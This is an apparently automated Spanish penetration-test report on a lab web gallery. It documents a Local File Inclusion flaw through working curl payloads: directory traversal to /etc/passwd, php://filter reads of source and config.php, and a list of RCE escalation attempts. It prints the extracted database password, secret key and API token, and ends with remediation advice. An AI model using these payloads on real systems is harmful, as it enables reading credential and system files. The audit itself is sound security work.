# Informe de Auditoría de Seguridad - Local File Inclusion (LFI)
**Fecha:** 2026-04-27T12:05:37  
**Objetivo:** http://web.dev.local:8081  
**Auditor:** Penetration Tester Experto (Kali Linux)  
**Tipo de Vulnerabilidad:** Local File Inclusion (LFI)  
**Severidad:** CRÍTICA

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **Local File Inclusion (LFI)** en el parámetro `page` del archivo `gallery.php`. La vulnerabilidad permite leer archivos arbitrarios del sistema de archivos del servidor, incluyendo archivos de configuración sensibles de la aplicación y el archivo `/etc/passwd` del sistema operativo.

| Estado | Resultado |
|--------|-----------|
| VULN_FOUND | ✅ true |
| VULN_EXPLOITED | ✅ true |

---

## 1. Reconocimiento

### Tecnologías Identificadas
- **Servidor Web:** Apache/2.4.65 (Debian)
- **Lenguaje:** PHP/8.1.33
- **Sistema Operativo:** Linux (Debian)

### Comandos de Reconocimiento

```bash
# Cabeceras HTTP
curl -s -I http://web.dev.local:8081/

# Análisis de la página principal
curl -s http://web.dev.local:8081/ | grep -E 'href|action|param|page|file|include|load'
```

### Puntos de Entrada Identificados

Al analizar la página principal se descubrió el siguiente parámetro dinámico susceptible de LFI:

```
http://web.dev.local:8081/gallery.php?page=modern
http://web.dev.local:8081/gallery.php?page=classic
http://web.dev.local:8081/gallery.php?page=abstract
http://web.dev.local:8081/gallery.php?page=about
```

El parámetro `page` carga archivos dinámicamente usando `include()`.

---

## 2. Análisis del Código Vulnerable

Mediante el wrapper `php://filter`, se extrajo el código fuente de `gallery.php`:

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php" | grep -oE '[A-Za-z0-9+/=]{50,}' | base64 -d
```

**Código PHP vulnerable (fragmento):**
```php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
```

**Análisis del fallo:** El parámetro `page` se pasa directamente a `include()` sin sanitización. Cuando el valor contiene un punto (`.`), se usa tal cual sin añadir el prefijo de directorio ni extensión `.php`. Esto permite Directory Traversal ilimitado.

---

## 3. Confirmación de la Vulnerabilidad (VULN_FOUND = true)

### 3.1 Payload Básico de LFI

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
```

**Resultado:** Lectura exitosa del archivo `/etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 3.2 Descubrimiento del Fichero de Configuración de la Aplicación

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=config.php" \
  | grep -oE '[A-Za-z0-9+/]{30,}={0,2}' | while read b64; do echo "$b64" | base64 -d 2>/dev/null; done
```

**Resultado - Fichero `config.php` expuesto:**
```php
<?php
// Secret configuration file
// Database credentials (example)

define('DB_HOST', 'localhost');
define('DB_USER', 'gallery_user');
define('DB_PASS', 'SuperSecret123!');
define('DB_NAME', 'gallery_db');

define('SECRET_KEY', 'th1s_is_a_v3ry_s3cr3t_k3y_2025');
define('API_TOKEN', 'api_token_abc123xyz789');

// This file can be exposed through LFI vulnerability
```

---

## 4. Explotación (VULN_EXPLOITED = true)

### 4.1 Lectura de Ficheros del Sistema Operativo

**Payload definitivo para `/etc/passwd`:**
```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
```
→ **ÉXITO**: Lectura completa del archivo `/etc/passwd` (18 entradas confirmadas).

### 4.2 Evasión de Filtros con PHP Wrappers

**Payload con `php://filter` para leer archivos PHP sin ejecución:**
```bash
# Leer gallery.php (código fuente)
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php"

# Leer /etc/passwd vía wrapper
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../etc/passwd"

# Leer config.php (credenciales)
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=config.php"
```

### 4.3 Variantes de Directory Traversal Probadas

```bash
# Traversal estándar (EXITOSO)
?page=../../../etc/passwd

# Traversal con profundidad adicional (EXITOSO - múltiples niveles funcionan)
?page=../../../../etc/passwd

# Ruta absoluta (sin éxito - se añade prefijo 'pages/' al no tener punto)
?page=/etc/passwd

# PHP Filter wrapper (EXITOSO)
?page=php://filter/read=convert.base64-encode/resource=../../../etc/passwd
```

### 4.4 Intentos de Escalada a RCE

Se intentaron los siguientes vectores para escalar a Ejecución Remota de Código:

| Vector | Resultado |
|--------|-----------|
| Log Poisoning (Apache access.log) | ❌ No accesible por www-data |
| `/proc/self/environ` | ❌ Permisos insuficientes |
| `/proc/self/fd/*` | ❌ No accesible |
| `data://` wrapper | ❌ Desactivado |
| `expect://` wrapper | ❌ No instalado |
| `php://input` | ❌ No aplicable sin POST |

---

## 5. Datos Sensibles Extraídos

### Credenciales de Base de Datos
```
Host:     localhost
Usuario:  gallery_user
Password: SuperSecret123!
Base de Datos: gallery_db
```

### Claves de la Aplicación
```
SECRET_KEY: th1s_is_a_v3ry_s3cr3t_k3y_2025
API_TOKEN:  api_token_abc123xyz789
```

### Información del Sistema
- Ruta absoluta del webroot: `/var/www/html/`
- Usuario web: `www-data` (uid=33, gid=33)
- Sistema: Debian Linux con Apache 2.4.65 y PHP 8.1.33

---

## 6. Impacto

| Impacto | Descripción |
|---------|-------------|
| **Lectura de archivos del SO** | `/etc/passwd` leído completamente - enumeración de usuarios del sistema |
| **Exposición de credenciales** | Contraseña de BD, claves secretas y tokens API comprometidos |
| **Divulgación de código fuente** | Todo el código PHP de la aplicación accesible mediante `php://filter` |
| **Path Disclosure** | Ruta absoluta del servidor revelada: `/var/www/html/` |
| **Acceso potencial a BD** | Con las credenciales expuestas, posible acceso a `gallery_db` |

---

## 7. Recomendaciones

1. **Nunca usar input del usuario directamente en `include()`** - implementar una whitelist de páginas permitidas:
   ```php
   $allowed = ['modern', 'classic', 'abstract', 'about'];
   if (in_array($page, $allowed)) {
       include("pages/" . $page . ".php");
   }
   ```

2. **Deshabilitar wrappers PHP peligrosos** en `php.ini`:
   ```ini
   allow_url_fopen = Off
   allow_url_include = Off
   ```

3. **Mover archivos de configuración** fuera del webroot o protegerlos con `.htaccess`.

4. **Cambiar todas las credenciales** expuestas inmediatamente.

5. **Implementar WAF** para detectar payloads de Directory Traversal (`../`, `php://`, etc.).

---

## 8. Conclusión

La aplicación **Galería de Arte Virtual** en `http://web.dev.local:8081` presenta una vulnerabilidad **crítica de LFI** que permite:
- Lectura de archivos arbitrarios del sistema operativo (`/etc/passwd`)
- Exfiltración de archivos de configuración sensibles (`config.php`) con credenciales en texto plano
- Enumeración completa del sistema de archivos accessible por `www-data`

La vulnerabilidad está confirmada y ha sido explotada exitosamente para obtener acceso a ficheros del sistema y credenciales de la aplicación.

---
*Informe generado automáticamente por análisis de seguridad ofensiva - Entorno de laboratorio autorizado*
